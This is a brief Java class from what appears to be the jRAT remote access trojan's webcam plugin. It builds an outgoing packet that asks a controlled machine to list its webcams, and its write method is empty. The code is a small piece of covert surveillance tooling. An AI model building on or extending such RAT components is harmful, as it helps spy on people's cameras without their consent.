package se.jrat.plugin.webcam.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import jrat.api.Client;
import jrat.api.net.PacketBuilder;

public class OutgoingPacket121ListWebcams extends PacketBuilder {

	public OutgoingPacket121ListWebcams(Client rat) {
		super(WebcamPlugin.HEADER_LIST_WEBCAMS, rat);
	}

	@Override
	public void write(Client rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		
	}

}
